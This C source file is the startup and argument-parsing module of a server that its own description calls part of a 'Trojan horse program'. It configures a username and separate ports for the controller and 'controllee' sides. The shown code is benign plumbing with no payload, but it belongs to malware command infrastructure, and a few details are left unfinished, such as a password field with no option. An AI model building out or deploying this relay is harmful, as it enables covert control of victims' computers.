//
// Created by cmtheit on 23-5-27.
//

#include "init.h"
#include "../config/config.h"
#include <argparse/argparse.h>
#include <stdio.h>
#include <event2/event.h>
#include "../util/printlog.h"
#include "../event/event.h"

static const char * uname = NULL;
static const char * psw = NULL;
static const char * eport_str = NULL;
static const char * mport_str = NULL;
static struct argparse_option options[] = {
    OPT_HELP(),
    OPT_GROUP("basic options"),
    OPT_STRING('u', "uname", &uname, "Username", NULL, 0, 0),
    OPT_STRING('e', "eport", &eport_str, "Controllee side port", NULL, 0, 0),
    OPT_STRING('m', "mport", &mport_str, "Controller side port", NULL, 0, 0),
    OPT_END()
};
static const char *const usages[] = {
    "server [options] [[--] args]",
    "server [options]",
    NULL,
};
static struct argparse argparse;

static InitResult init_events() {
    EventsInitResult e_res = global_events_init();
    InitResult res = result_new_ok(0);
    if (result_is_err(e_res)) {
        switch (result_unwrap(e_res)) {
            case EventsInitErrorHeap:
                result_turn_err(res, InitResultErrorInitEventHeap);
                break;
            case EventsInitErrorOther:
            default:
                result_turn_err(res, InitResultErrorInitEventOther);
                break;
        }
    }
    return res;
}

static InitResult init_config() {
    InitResult result = result_new_ok(0);
    ConfigUnameOption uname_opt = option_new_none();
    if (uname) {
        option_turn_some(uname_opt, uname);
    }
    ConfigPswOption psw_opt = option_new_none();
    if (psw) {
        option_turn_some(psw_opt, psw);
    }
    ConfigPortOption eport_opt = option_new_none();
    ConfigPortOption mport_opt = option_new_none();
    if (eport_str) {
        option_turn_some(eport_opt, atoi(eport_str));
    }
    if (mport_str) {
        option_turn_some(mport_opt, atoi(mport_str));
    }
    ConfigInitResult config_init_result = config_init(
        uname_opt,
        psw_opt,
        mport_opt,
        eport_opt
    );
    if (result_is_err(config_init_result)) {
        result_turn_err(result, InitResultOther)
        return result;
    }
    return result;
}

InitResult init(int argc, const char ** argv) {
    InitResult result = result_new_ok(0);
    event_set_log_callback(event2_print_log);
    argparse_init(&argparse, options, usages, 0);
    argparse_describe(&argparse, "Server of this Trojan horse program", "部署以后观察它的IP");
    argparse_parse(&argparse, argc, argv);

    InitResult init_events_result = init_events();
    if (result_is_err(init_events_result)) {
        return init_events_result;
    }

    InitResult init_config_result = init_config();
    if (result_is_err(init_config_result)) {
        return init_config_result;
    }
    return result;
}